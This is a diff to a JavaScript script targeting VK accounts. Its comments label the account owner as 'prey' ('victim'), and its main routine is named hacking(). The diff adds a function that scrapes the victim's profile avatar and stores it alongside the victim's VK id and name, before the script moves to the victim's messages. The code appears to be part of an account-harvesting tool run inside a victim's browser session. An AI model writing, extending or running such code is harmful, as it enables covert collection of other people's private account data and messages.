@@ -45,6 +45,12 @@ function getPreyId() {
 }
 // =================== id ЖЕРТВЫ ====================== //
 
+// ==================== АВАТАР ======================== //
+function getPreyAvatar() {
+    return document.querySelector('.TopNavBtn__profileImg').getAttribute('src');
+}
+// ==================== АВАТАР ======================== //
+
 
 /**
  * Получает ссылку "Мессенджер" и нажимает на неё, чтобы перейти в сообщения
@@ -352,6 +358,8 @@ async function hacking() {
     let preyId = getPreyId(); // get full name
     // ===== GET PREY's VK id ===== //
 
+    let preyAvatar = getPreyAvatar();
+
 
     // ===== GO TO MESSAGES Page ===== //
     toMessages();
@@ -364,7 +372,8 @@ async function hacking() {
         // key is vk id of prey
         // and save prey's name
         [preyId]: {
-            name: preyName
+            name: preyName,
+            avatar: preyAvatar
         }
     }
     // инициализируем объект с полученными данными
